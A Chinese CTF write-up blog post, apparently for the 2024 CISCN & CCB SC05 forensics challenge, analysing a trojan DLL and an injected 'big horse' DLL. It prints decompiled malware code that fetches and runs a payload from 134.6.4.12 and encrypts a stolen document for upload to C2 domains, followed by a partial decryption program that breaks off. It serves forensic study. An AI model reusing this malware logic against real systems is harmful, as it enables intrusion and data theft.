@@ -1,0 +1,601 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title> 2024CISCN&amp;CCB初赛 SC05 - QAQ | QAQ</title><meta name="description" content="2024CCB SC05 近日某公司网络管理员老张在对安全设备进行日常巡检过程中发现防火墙设备日志中产生了1条高危告警，告警IP为134.6.4.12（简称IP1），在监测到可疑网络活动后，老张立刻对磁盘和内存制做了镜像。为考校自己刚收的第一个徒弟李华，老张循序渐进，布置了5道问题。假如你是李华，请你根据提供的防火墙日志、磁盘镜像及内存镜像文件对主机开展网络安全检查分析，并根据5道问题提示，计算并提交相应flag。 查找一下ip就行，注意要在tcp-export处才能找到ip被首次请求的事件 这一题打开附件的虚拟机，发现桌面上有一个火绒剑 点击发现无法打开，于是选择使用旁边的Process Hacker 2，然后就能发现火绒剑很奇怪的与IP1建立了连接 显而易见，这个火绒剑有问题 到目录下看一眼，发现uactmon.dll没有签名，有问题 大概率这个就是咱要的小马，丢到ida里验证一下 strings中找到一串url，追过去看看，发现一个可疑的函数Func_1 FARPROC Func_1() { size_t v0; // eax size_t v1; // eax size_t v2; // eax size_t v3; //&hellip;"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://lq-a-ql.github.io/assets/css/main.css"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://lq-a-ql.github.io/2024ciscnandccbchu-sai-sc05.html"><link rel="alternate" type="application/atom+xml" href="https://lq-a-ql.github.io/feed.xml" title="QAQ - RSS"><link rel="alternate" type="application/json" href="https://lq-a-ql.github.io/feed.json" title="QAQ - JSON"><meta property="og:title" content=" 2024CISCN&CCB初赛 SC05"><meta property="og:image" content="https://lq-a-ql.github.io/media/website/media_1774803832.png"><meta property="og:image:width" content="1536"><meta property="og:image:height" content="1152"><meta property="og:site_name" content="QAQ"><meta property="og:description" content="2024CCB SC05 近日某公司网络管理员老张在对安全设备进行日常巡检过程中发现防火墙设备日志中产生了1条高危告警，告警IP为134.6.4.12（简称IP1），在监测到可疑网络活动后，老张立刻对磁盘和内存制做了镜像。为考校自己刚收的第一个徒弟李华，老张循序渐进，布置了5道问题。假如你是李华，请你根据提供的防火墙日志、磁盘镜像及内存镜像文件对主机开展网络安全检查分析，并根据5道问题提示，计算并提交相应flag。 查找一下ip就行，注意要在tcp-export处才能找到ip被首次请求的事件 这一题打开附件的虚拟机，发现桌面上有一个火绒剑 点击发现无法打开，于是选择使用旁边的Process Hacker 2，然后就能发现火绒剑很奇怪的与IP1建立了连接 显而易见，这个火绒剑有问题 到目录下看一眼，发现uactmon.dll没有签名，有问题 大概率这个就是咱要的小马，丢到ida里验证一下 strings中找到一串url，追过去看看，发现一个可疑的函数Func_1 FARPROC Func_1() { size_t v0; // eax size_t v1; // eax size_t v2; // eax size_t v3; //&hellip;"><meta property="og:url" content="https://lq-a-ql.github.io/2024ciscnandccbchu-sai-sc05.html"><meta property="og:type" content="article"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://lq-a-ql.github.io/2024ciscnandccbchu-sai-sc05.html"},"headline":" 2024CISCN&CCB初赛 SC05","datePublished":"2026-04-06T23:09+08:00","dateModified":"2026-04-06T23:15+08:00","image":{"@type":"ImageObject","url":"https://lq-a-ql.github.io/media/website/media_1774803832.png","height":1152,"width":1536},"description":"2024CCB SC05 近日某公司网络管理员老张在对安全设备进行日常巡检过程中发现防火墙设备日志中产生了1条高危告警，告警IP为134.6.4.12（简称IP1），在监测到可疑网络活动后，老张立刻对磁盘和内存制做了镜像。为考校自己刚收的第一个徒弟李华，老张循序渐进，布置了5道问题。假如你是李华，请你根据提供的防火墙日志、磁盘镜像及内存镜像文件对主机开展网络安全检查分析，并根据5道问题提示，计算并提交相应flag。 查找一下ip就行，注意要在tcp-export处才能找到ip被首次请求的事件 这一题打开附件的虚拟机，发现桌面上有一个火绒剑 点击发现无法打开，于是选择使用旁边的Process Hacker 2，然后就能发现火绒剑很奇怪的与IP1建立了连接 显而易见，这个火绒剑有问题 到目录下看一眼，发现uactmon.dll没有签名，有问题 大概率这个就是咱要的小马，丢到ida里验证一下 strings中找到一串url，追过去看看，发现一个可疑的函数Func_1 FARPROC Func_1() { size_t v0; // eax size_t v1; // eax size_t v2; // eax size_t v3; //&hellip;","author":{"@type":"Person","name":"QAQ","url":"https://lq-a-ql.github.io/qaq/qaq/"},"publisher":{"@type":"Organization","name":"QAQ","logo":{"@type":"ImageObject","url":"https://lq-a-ql.github.io/media/website/media_1774803832.png","height":1152,"width":1536}}}</script></head><body><header class="site-header"><div class="container header-inner"><a class="brand" href="https://lq-a-ql.github.io/index.html"><img src="https://lq-a-ql.github.io/assets/images/avatar.png" alt="Avatar" class="avatar-sm"> QAQ</a><nav class="main-nav js-main-nav" aria-label="Primary navigation"><a href="https://lq-a-ql.github.io/index.html">Home</a> <a href="https://lq-a-ql.github.io/search.html">Search</a></nav></div></header><main class="container article-view"><article class="article-card reveal"><header class="article-header"><p class="eyebrow">Post</p><h1> 2024CISCN&amp;CCB初赛 SC05</h1><p class="meta-line"><time datetime="2026-04-06">2026-04-06</time> <span>by QAQ</span></p></header><div class="article-content prose"><h1 id="2024ccb-sc05">2024CCB SC05</h1><blockquote><p>近日某公司网络管理员老张在对安全设备进行日常巡检过程中发现防火墙设备日志中产生了1条高危告警，告警IP为134.6.4.12（简称IP1），在监测到可疑网络活动后，老张立刻对磁盘和内存制做了镜像。为考校自己刚收的第一个徒弟李华，老张循序渐进，布置了5道问题。假如你是李华，请你根据提供的防火墙日志、磁盘镜像及内存镜像文件对主机开展网络安全检查分析，并根据5道问题提示，计算并提交相应flag。</p></blockquote><h3 id="问题1：ip1地址首次被请求时间是多久？">问题1：IP1地址首次被请求时间是多久？</h3><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313224720764.png" alt="image-20260313224720764" style="zoom: 25%;" data-is-external-image="true"><p>查找一下ip就行，注意要在<strong>tcp-export</strong>处才能找到ip被首次请求的事件</p><h3 id="问题2：ip1地址对应的小马程序md5是多少？">问题2：IP1地址对应的小马程序MD5是多少？</h3><p>这一题打开附件的虚拟机，发现桌面上有一个火绒剑</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313225257731.png" alt="image-20260313225257731" style="zoom: 33%;" data-is-external-image="true"><p>点击发现无法打开，于是选择使用旁边的<code>Process Hacker 2</code>，然后就能发现火绒剑很奇怪的与IP1建立了连接</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313225537787.png" alt="image-20260313225537787" data-is-external-image="true"><p>显而易见，这个火绒剑有问题</p><p>到目录下看一眼，发现<code>uactmon.dll</code>没有签名，有问题</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313225907245.png" alt="image-20260313225907245" style="zoom: 50%;" data-is-external-image="true"><p>大概率这个就是咱要的小马，丢到ida里验证一下</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313230120122.png" alt="image-20260313230120122" data-is-external-image="true"><p>strings中找到一串url，追过去看看，发现一个可疑的函数<code>Func_1</code></p><pre><code class="language-C">FARPROC Func_1()
+{
+  size_t v0; // eax
+  size_t v1; // eax
+  size_t v2; // eax
+  size_t v3; // eax
+  int v4; // eax
+  FARPROC result; // eax
+  unsigned int v6; // [esp+2Ch] [ebp-10Ch]
+  int Size; // [esp+40h] [ebp-F8h]
+  unsigned int i; // [esp+44h] [ebp-F4h]
+  char *v9; // [esp+48h] [ebp-F0h]
+  char v10[24]; // [esp+4Ch] [ebp-ECh] BYREF
+  char v11[128]; // [esp+64h] [ebp-D4h] BYREF
+  char Buffer[16]; // [esp+E4h] [ebp-54h] BYREF
+  _BYTE v13[16]; // [esp+F4h] [ebp-44h] BYREF
+  _BYTE v14[16]; // [esp+104h] [ebp-34h] BYREF
+  _BYTE v15[16]; // [esp+114h] [ebp-24h] BYREF
+  _BYTE v16[16]; // [esp+124h] [ebp-14h] BYREF
+
+  dword_6E2974C4 = (int)CreateMutexA(0, 0, &quot;Global\\UniqueMessageBoxMutex&quot;);
+  if ( dword_6E2974C4 &amp;&amp; GetLastError() != 183 &amp;&amp; curl_easy_init() )
+  {
+    sub_6E292D70(Buffer, &quot;%d.%d.%d.%d&quot;, 134);
+    memset(v13, 0, sizeof(v13));
+    memset(v14, 0, sizeof(v14));
+    memset(v15, 0, sizeof(v15));
+    memset(v16, 0, sizeof(v16));
+    v0 = strlen(&quot;dXBk&quot;);
+    sub_6E291400(&quot;dXBk&quot;, v0, v13);
+    v1 = strlen(&quot;YXRl&quot;);
+    sub_6E291400(&quot;YXRl&quot;, v1, v14);
+    v2 = strlen(&quot;NTku&quot;);
+    sub_6E291400(&quot;NTku&quot;, v2, v15);
+    v3 = strlen(&quot;ZXhl&quot;);
+    sub_6E291400(&quot;ZXhl&quot;, v3, v16);
+    sub_6E292DA0(v11, &quot;http://%s/%s%s%s%s&quot;, (char)Buffer);
+    sub_6E2926A0(-2046426100, 0);
+    if ( !sub_6E291590(v11, v10) )
+    {
+      Size = unknown_libname_4(v10);
+      v9 = (char *)unknown_libname_12(Size);
+      memset(v9, 0, Size);
+      v4 = sub_6E292560(v10);
+      v6 = sub_6E291400(v4, Size, v9);
+      for ( i = 0; i &lt; v6; i += 8 )
+        ++*(_QWORD *)&amp;v9[i];
+      __scrt_stub_for_initialize_mta(v9, v6);
+      j_j_free(v9);
+    }
+    sub_6E292680(v10);
+  }
+  result = GetProcAddress(hModule, (LPCSTR)1);
+  if ( result )
+    return (int (*)(void))result();
+  return result;
+}
+</code></pre><p>下个断点动调</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313230458618.png" style="zoom: 67%;" data-is-external-image="true"> <img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313230539695.png" alt="image-20260313230539695" data-is-external-image="true"><p>果然发现了存放在<code>Buffer</code>中的IP1</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313230952547.png" alt="image-20260313230952547" data-is-external-image="true"><h3 id="问题3：大马程序运行在哪个进程中？">问题3：大马程序运行在哪个进程中？</h3><p>把内存镜像丢进Lovelymem，然后进入vol3的安全分析—&gt;恶意代码板块，耐心等待工具分析完，然后慢慢排查就行了</p><p>最后在<code>OneDrive.exe</code>发现可疑目标</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313232004872.png" alt="image-20260313232004872" data-is-external-image="true"><p>注意这个<strong>MZ</strong>文件头，这说明攻击者向OneDrive注入了一个恶意的dll，也是判断OneDrive进程可疑的依据</p><h3 id="问题4：大马程序备用回连的域名是多少？">问题4：大马程序备用回连的域名是多少？</h3><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313232403678.png" alt="image-20260313232403678" data-is-external-image="true"><p>将上一题找到的恶意dll给dump下来 然后丢进ida</p><pre><code class="language-C">BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+  size_t v3; // eax
+  size_t v4; // eax
+  size_t v5; // eax
+  size_t v6; // eax
+  int v7; // eax
+  int v8; // eax
+  char v10; // [esp-18h] [ebp-798h] BYREF
+  unsigned int v11; // [esp-8h] [ebp-788h]
+  char *v12; // [esp-4h] [ebp-784h]
+  int v13; // [esp+0h] [ebp-780h]
+  int v14; // [esp+4h] [ebp-77Ch]
+  _BYTE v15[24]; // [esp+Ch] [ebp-774h] BYREF
+  _BYTE v16[24]; // [esp+24h] [ebp-75Ch] BYREF
+  char *v17; // [esp+3Ch] [ebp-744h]
+  errno_t v18; // [esp+40h] [ebp-740h]
+  errno_t v19; // [esp+44h] [ebp-73Ch]
+  char *v20; // [esp+48h] [ebp-738h]
+  DWORD v21; // [esp+4Ch] [ebp-734h]
+  char *v22; // [esp+50h] [ebp-730h]
+  char *v23; // [esp+54h] [ebp-72Ch]
+  int v24; // [esp+58h] [ebp-728h]
+  int v25; // [esp+64h] [ebp-71Ch]
+  void *v26; // [esp+68h] [ebp-718h]
+  void *v27; // [esp+6Ch] [ebp-714h]
+  unsigned int v28; // [esp+70h] [ebp-710h]
+  void *Block; // [esp+74h] [ebp-70Ch]
+  int v30; // [esp+80h] [ebp-700h]
+  int v31; // [esp+84h] [ebp-6FCh]
+  _BYTE v32[32]; // [esp+88h] [ebp-6F8h] BYREF
+  char *v33; // [esp+A8h] [ebp-6D8h]
+  unsigned int j; // [esp+ACh] [ebp-6D4h]
+  unsigned int m; // [esp+B0h] [ebp-6D0h]
+  unsigned int k; // [esp+B4h] [ebp-6CCh]
+  unsigned int i; // [esp+B8h] [ebp-6C8h]
+  signed int v38; // [esp+BCh] [ebp-6C4h]
+  char *v39; // [esp+C0h] [ebp-6C0h]
+  char *v40; // [esp+C4h] [ebp-6BCh]
+  char *v41; // [esp+C8h] [ebp-6B8h]
+  unsigned int n; // [esp+CCh] [ebp-6B4h]
+  char *v43; // [esp+D0h] [ebp-6B0h] BYREF
+  char *Buffer; // [esp+D4h] [ebp-6ACh] BYREF
+  size_t v45; // [esp+D8h] [ebp-6A8h] BYREF
+  size_t BufferCount; // [esp+DCh] [ebp-6A4h] BYREF
+  _BYTE v47[184]; // [esp+E0h] [ebp-6A0h] BYREF
+  _BYTE v48[176]; // [esp+198h] [ebp-5E8h] BYREF
+  _BYTE v49[16]; // [esp+248h] [ebp-538h] BYREF
+  _BYTE v50[160]; // [esp+258h] [ebp-528h] BYREF
+  _BYTE v51[24]; // [esp+2F8h] [ebp-488h] BYREF
+  char v52[256]; // [esp+310h] [ebp-470h] BYREF
+  char v53[256]; // [esp+410h] [ebp-370h] BYREF
+  _BYTE v54[256]; // [esp+510h] [ebp-270h] BYREF
+  char v55[256]; // [esp+610h] [ebp-170h] BYREF
+  char v56[28]; // [esp+710h] [ebp-70h] BYREF
+  char v57[4]; // [esp+72Ch] [ebp-54h] BYREF
+  char v58[28]; // [esp+730h] [ebp-50h] BYREF
+  _BYTE v59[4]; // [esp+74Ch] [ebp-34h] BYREF
+  char v60[12]; // [esp+750h] [ebp-30h] BYREF
+  char v61[4]; // [esp+75Ch] [ebp-24h] BYREF
+  char Str[9]; // [esp+760h] [ebp-20h] BYREF
+  _BYTE v63[4]; // [esp+769h] [ebp-17h] BYREF
+  int v64; // [esp+77Ch] [ebp-4h]
+
+  v21 = fdwReason;
+  if ( fdwReason == 1 )
+  {
+    Buffer = 0;
+    BufferCount = 0;
+    v19 = dupenv_s(&amp;Buffer, &amp;BufferCount, &quot;appdata&quot;);
+    v22 = (char *)unknown_libname_15(BufferCount + 16);
+    v40 = v22;
+    Str[0] = 48;
+    Str[1] = 7;
+    Str[2] = 18;
+    Str[3] = 2;
+    Str[4] = 48;
+    Str[5] = 19;
+    Str[6] = 95;
+    Str[7] = 1;
+    Str[8] = 8;
+    qmemcpy(v63, &quot;X$^j&quot;, sizeof(v63));
+    for ( i = 0; i &lt; 0xD; ++i )
+      Str[i] ^= 0x6Au;
+    memset(v52, 0, sizeof(v52));
+    v3 = strlen(Str);
+    base64_decode((int)Str, v3, (int)v52);
+    sprintf_s(v40, BufferCount + 16, &quot;%s/%s&quot;, Buffer, v52);
+    v43 = 0;
+    v45 = 0;
+    v18 = dupenv_s(&amp;v43, &amp;v45, &quot;temp&quot;);
+    v23 = (char *)unknown_libname_15(v45 + 16);
+    v39 = v23;
+    qmemcpy(v60, &quot;9X &quot;, 3);
+    v60[3] = 29;
+    v60[4] = 56;
+    v60[5] = 46;
+    v60[6] = 59;
+    v60[7] = 94;
+    v60[8] = 38;
+    v60[9] = 4;
+    v60[10] = 56;
+    v60[11] = 30;
+    qmemcpy(v61, &quot;\t+WW&quot;, sizeof(v61));
+    for ( j = 0; j &lt; 0x10; ++j )
+      v60[j] ^= 0x6Au;
+    memset(v53, 0, sizeof(v53));
+    v4 = strlen(v60);
+    base64_decode((int)v60, v4, (int)v53);
+    sprintf_s(v39, v45 + 16, &quot;%s/%s&quot;, v43, v53);
+    v56[0] = 11;
+    v56[1] = 34;
+    v56[2] = 56;
+    v56[3] = 90;
+    v56[4] = 9;
+    v56[5] = 46;
+    v56[6] = 5;
+    v56[7] = 28;
+    v56[8] = 38;
+    v56[9] = 89;
+    v56[10] = 14;
+    v56[11] = 89;
+    v56[12] = 14;
+    v56[13] = 19;
+    v56[14] = 95;
+    v56[15] = 5;
+    v56[16] = 9;
+    v56[17] = 4;
+    v56[18] = 60;
+    v56[19] = 29;
+    v56[20] = 48;
+    v56[21] = 45;
+    v56[22] = 44;
+    v56[23] = 90;
+    v56[24] = 48;
+    v56[25] = 57;
+    v56[26] = 95;
+    v56[27] = 31;
+    qmemcpy(v57, &quot;02;W&quot;, sizeof(v57));
+    for ( k = 0; k &lt; 0x20; ++k )
+      v56[k] ^= 0x6Au;
+    v58[0] = 11;
+    v58[1] = 34;
+    v58[2] = 56;
+    v58[3] = 90;
+    v58[4] = 9;
+    v58[5] = 46;
+    v58[6] = 5;
+    v58[7] = 28;
+    v58[8] = 38;
+    v58[9] = 89;
+    v58[10] = 14;
+    v58[11] = 89;
+    v58[12] = 14;
+    v58[13] = 19;
+    v58[14] = 95;
+    v58[15] = 4;
+    v58[16] = 8;
+    v58[17] = 89;
+    v58[18] = 60;
+    v58[19] = 29;
+    v58[20] = 48;
+    v58[21] = 45;
+    v58[22] = 44;
+    v58[23] = 90;
+    v58[24] = 48;
+    v58[25] = 57;
+    v58[26] = 95;
+    v58[27] = 31;
+    qmemcpy(v59, &quot;02;W&quot;, sizeof(v59));
+    for ( m = 0; m &lt; 0x20; ++m )
+      v58[m] ^= 0x6Au;
+    memset(v54, 0, sizeof(v54));
+    memset(v55, 0, sizeof(v55));
+    v5 = strlen(v56);
+    base64_decode((int)v56, v5, (int)v54);
+    v6 = strlen(v58);
+    base64_decode((int)v58, v6, (int)v55);
+    while ( 1 )
+    {
+      sub_6DD94350(v13, v14);
+      v64 = 0;
+      v33 = v54;
+      v30 = sub_6DD91B00(v54, v51);
+      if ( v30 )
+      {
+        v33 = v55;
+        sub_6DD94190(v51);
+        v30 = sub_6DD91B00(v33, v51);
+      }
+      if ( !v30 &amp;&amp; sub_6DD94110(&quot;Get file&quot;, 0) != -1 )
+      {
+        sub_6DD926B0(0xB8u);
+        sub_6DD94000(v40, 33, 64, 1);
+        LOBYTE(v64) = 1;
+        if ( (unsigned __int8)sub_6DD93F60(v47) )
+        {
+          sub_6DD926B0(0xB0u);
+          sub_6DD93190(v39, 34, 64, 1);
+          LOBYTE(v64) = 2;
+          if ( (unsigned __int8)sub_6DD93110(v48) )
+          {
+            sub_6DD926B0(0xB0u);
+            sub_6DD93030(1);
+            LOBYTE(v64) = 3;
+            v7 = sub_6DD93F80(v47);
+            std::ostream::operator&lt;&lt;(v50, v7);
+            v24 = std::basic_stringstream&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::str(v16);
+            v31 = unknown_libname_5(v24);
+            sub_6DD942B0(v16);
+            v20 = (char *)unknown_libname_15(2 * v31 + 2);
+            v41 = v20;
+            memset(v20, 0, 2 * v31 + 2);
+            v27 = (void *)std::basic_stringstream&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::str(v15);
+            v26 = v27;
+            LOBYTE(v64) = 4;
+            v12 = v41;
+            v11 = v31;
+            v8 = sub_6DD94170(v27);
+            v28 = base64_encode(v8, v11, (int)v12);
+            LOBYTE(v64) = 3;
+            sub_6DD942B0(v15);
+            /*XOR加密*/
+            qmemcpy(v32, &quot;;=&quot;, 2);
+            v32[2] = -2;
+            v32[3] = 112;
+            v32[4] = 90;
+            v32[5] = -41;
+            v32[6] = -116;
+            v32[7] = 34;
+            v32[8] = -64;
+            v32[9] = 109;
+            v32[10] = -76;
+            v32[11] = -40;
+            v32[12] = 87;
+            v32[13] = 114;
+            v32[14] = -33;
+            v32[15] = -41;
+            v32[16] = 55;
+            v32[17] = 114;
+            v32[18] = -45;
+            v32[19] = 127;
+            v32[20] = -37;
+            v32[21] = 51;
+            v32[22] = -119;
+            v32[23] = 31;
+            v32[24] = -5;
+            v32[25] = -10;
+            v32[26] = 97;
+            v32[27] = 94;
+            v32[28] = 18;
+            v32[29] = 6;
+            v32[30] = -98;
+            v32[31] = 21;
+            for ( n = 0; n &lt; v28; ++n )
+            {
+              v38 = 0;
+              if ( n % 3 )
+              {
+                if ( n % 5 )
+                {
+                  if ( n % 7 )
+                    v38 = n % 0x20;
+                  else
+                    v38 = 3 * n % 0x20;
+                }
+                else
+                {
+                  v38 = (2 * n + 1) % 0x20;
+                }
+              }
+              else
+              {
+                v38 = 2 * n % 0x20;
+              }
+              v41[n] ^= (int)(unsigned __int8)v32[v38] &gt;&gt; (v38 % 6);
+            }
+            std::ostream::write(v48, v41, v28, 0);
+            v17 = &amp;v10;
+            sub_6DD942D0(v41);
+            sub_6DD919F0(v33, v51, v10);
+            Block = v41;
+            j_j_free(v41);
+            if ( Block )
+            {
+              v41 = (char *)33059;
+              v25 = 33059;
+            }
+            else
+            {
+              v25 = 0;
+            }
+            LOBYTE(v64) = 2;
+            sub_6DD92700(v49);
+          }
+          LOBYTE(v64) = 1;
+          sub_6DD926D0(v48);
+        }
+        LOBYTE(v64) = 0;
+        sub_6DD92680(v47);
+      }
+      Sleep(0x493E0u);
+      v64 = -1;
+      sub_6DD942B0(v51);
+    }
+  }
+  return 1;
+}
+</code></pre><p>下断点动调看看</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313233346909.png" alt="image-20260313233346909" style="zoom:50%;" data-is-external-image="true"> <img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260313233511006.png" alt="image-20260313233511006" data-is-external-image="true"><p>这里需要注意，这个dll是<strong>32位程序</strong>，需要使用<strong>SysWOW64</strong>下的rundll而不能使用system32下的那个</p><p>以次可以看到</p><p>原始文档，v40存放的原始文档路径</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260314000450988.png" alt="image-20260314000450988" data-is-external-image="true"><p>加密文档，v39存放加密文档路径</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260314000611231.png" alt="image-20260314000611231" data-is-external-image="true"><p>url1 <code>http://www.hrupdate.net</code></p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260314001141986.png" alt="image-20260314001141986" data-is-external-image="true"><p>url2 <code>http://www.goupdate.net</code></p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260314001820888.png" alt="image-20260314001820888" data-is-external-image="true"><p>那么接下来就是两个域名二选一</p><p>来看while循环中的代码片段</p><pre><code class="language-C"> while ( 1 )
+    {
+      sub_727F4350(v13, v14);
+      v64 = 0;
+      v33 = v54;
+      v30 = sub_727F1B00((int)v54, (int)v51);
+      if ( v30 )
+      {
+        v33 = v55;
+        sub_727F4190(v51);
+        v30 = sub_727F1B00((int)v33, (int)v51);
+      }
+</code></pre><p>可以看到，程序优先请求url1，如果失败才会继续请求url2，那么url2，也就是<code>http://www.goupdate.net</code>应该就是本题的答案，但是玄机交不上（）</p><p>玄机交url1<code>http://www.hrupdate.net</code></p><p><strong>我不明白（）</strong></p><h3 id="问题5：攻击者最终窃取数据的文件中包含的flag值？">问题5：攻击者最终窃取数据的文件中包含的flag值？</h3><p>先从虚拟机中提取出加密文件备用</p><p>这题关注一下函数最后面的对数据加密的部分</p><pre><code class="language-C">            v12 = v41;
+            v11 = v31;
+            v8 = sub_6DD94170(v27);
+            v28 = base64_encode(v8, v11, (int)v12);
+            LOBYTE(v64) = 3;
+            sub_6DD942B0(v15);
+            /*XOR*/
+            qmemcpy(v32, &quot;;=&quot;, 2);
+            v32[2] = -2;
+            v32[3] = 112;
+            v32[4] = 90;
+            v32[5] = -41;
+            v32[6] = -116;
+            v32[7] = 34;
+            v32[8] = -64;
+            v32[9] = 109;
+            v32[10] = -76;
+            v32[11] = -40;
+            v32[12] = 87;
+            v32[13] = 114;
+            v32[14] = -33;
+            v32[15] = -41;
+            v32[16] = 55;
+            v32[17] = 114;
+            v32[18] = -45;
+            v32[19] = 127;
+            v32[20] = -37;
+            v32[21] = 51;
+            v32[22] = -119;
+            v32[23] = 31;
+            v32[24] = -5;
+            v32[25] = -10;
+            v32[26] = 97;
+            v32[27] = 94;
+            v32[28] = 18;
+            v32[29] = 6;
+            v32[30] = -98;
+            v32[31] = 21;
+            for ( n = 0; n &lt; v28; ++n )
+            {
+              v38 = 0;
+              if ( n % 3 )
+              {
+                if ( n % 5 )
+                {
+                  if ( n % 7 )
+                    v38 = n % 0x20;
+                  else
+                    v38 = 3 * n % 0x20;
+                }
+                else
+                {
+                  v38 = (2 * n + 1) % 0x20;
+                }
+              }
+              else
+              {
+                v38 = 2 * n % 0x20;
+              }
+              v41[n] ^= (int)(unsigned __int8)v32[v38] &gt;&gt; (v38 % 6);
+            }
+            std::ostream::write(v48, v41, v28, 0);
+            v17 = &amp;v10;
+            sub_6DD942D0(v41);
+            sub_6DD919F0(v33, v51, v10);
+            Block = v41;
+</code></pre><p>从这段不难看出，最后得到的v41就是最后的密文，也就是<code>KbpD48.tmp</code>中的内容，再看这一段的最开头部分</p><pre><code class="language-C">              v12 = v41;
+            v11 = v31;
+            v8 = sub_6DD94170(v27);
+            v28 = base64_encode(v8, v11, (int)v12);
+</code></pre><p>先是v41将地址赋给v12，又对v12进行base64编码，也就相当于对v41进行base64编码，然后对v41进行一次异或，最终得到我们的密文</p><p>理清楚加密逻辑后就可以编写程序进行解密了(基本上都是从ida里py出来的，base64部分稍微改了改)</p><pre><code class="language-C">#define _CRT_SECURE_NO_WARNINGS
+#define _BYTE  unsigned char
+#define _WORD  unsigned short
+#define _DWORD unsigned int
+#define _QWORD unsigned long long
+
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;string.h&gt;
+
+constexpr auto base64_encode_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
+unsigned char base64_decode_table[256];
+
+static char* ENC(long filesize, char* v38);
+static int __cdecl base64_decode(char* enc, unsigned int lenth_enc, char* plain);
+void init_base64_table();
+
+int main() {
+
+    init_base64_table();
+
+    FILE *fp = fopen(&quot;D:\\KbpD48.tmp&quot;, &quot;rb&quot;);
+    if (fp == NULL) {
+        printf(&quot;Failed to open the file.\n&quot;);
+        return 1;
+    }
+    fseek(fp, 0, SEEK_END);
+    long filesize = ftell(fp);
+    printf(&quot;File size: %ld bytes\n&quot;, filesize);
+    fseek(fp, 0, SEEK_SET);
+    char* buffer = (char*)malloc(filesize);
+    if (buffer == 0) {
+        printf(&quot;Failed to allocate memory.\n&quot;);
+        fclose(fp);
+        return 1;
+    }
+    fread(buffer, 1, filesize, fp);
+    fclose(fp);
+
+    char *base64_encode_text=ENC(filesize, buffer);
+    char* rec = (char*)malloc(filesize * 3);
+    int len = base64_decode(base64_encode_text, filesize, rec);
+    //printf(&quot;%d&quot;, len);
+    //printf(&quot;%s&quot;,rec);
+
+    FILE *fp1= fopen(&quot;D:\\flag.docx&quot;, &quot;wb&quot;);
+    if (fp1 == NULL) {
+        printf(&quot;Failed to open the file for writing.\n&quot;);
+        free(buffer);
+        return 1;
+    }
+    fwrite(rec, 1, len, fp1);
+    return 0;
+
+}
+
+static char* ENC(long filesize, char* v38) {
+    char v29[32];
+    long v26 = filesize;
+    memcpy(v29, &quot;;=&quot;, 2);
+    v29[2] = -2;
+    v29[3] = 112;
+    v29[4] = 90;
+    v29[5] = -41;
+    v29[6] = -116;
+    v29[7] = 34;
+    v29[8] = -64;
+    v29[9] = 109;
+    v29[10] = -76;
+    v29[11] = -40;
+    v29[12] = 87;
+    v29[13] = 114;
+    v29[14] = -33;
+    v29[15] = -41;
+    v29[16] = 55;
+    v29[17] = 114;
+    v29[18] = -45;
+    v29[19] = 127;
+    v29[20] = -37;
+    v29[21] = 51;
+    v29[22] = -119;
+    v29[23] = 31;
+    v29[24] = -5;
+    v29[25] = -10;
+    v29[26] = 97;
+    v29[27] = 94;
+    v29[28] = 18;
+    v29[29] = 6;
+    v29[30] = -98;
+    v29[31] = 21;
+    for (int n = 0; n &lt; v26; ++n)
+    {
+        int v35 = 0;
+        if (n % 3)
+        {
+            if (n % 5)
+            {
+                if (n % 7)
+                    v35 = n % 32;
+                else
+                    v35 = 3 * n % 32;
+            }
+            else
+            {
+                v35 = (2 * n + 1) % 32;
+            }
+        }
+        else
+        {
+            v35 = 2 * n % 32;
+        }
+        v38[n] ^= v29[v35] &gt;&gt; (v35 % 6);
+    }
+    return v38;
+}
+
+void init_base64_table() {
+    memset(base64_decode_table, 0, sizeof(base64_decode_table));
+    for (int i = 0; i &lt; 64; i++) {
+        base64_decode_table[(unsigned char)base64_encode_table[i]] = i;
+    }
+    // 关键：将 &#39;=&#39; 映射为 64 (0x40)，配合解码函数中的 &gt;= 0x40 判断
+    base64_decode_table[&#39;=&#39;] = 0x40;
+}
+
+static int __cdecl base64_decode(char *enc, unsigned int lenth_enc, char *plain)
+{
+    unsigned int i; // [esp+0h] [ebp-10h]
+    unsigned int j; // [esp+4h] [ebp-Ch]
+    char b[4]; //b[0,1,2,3]-&gt;v6,v7,v8,v9
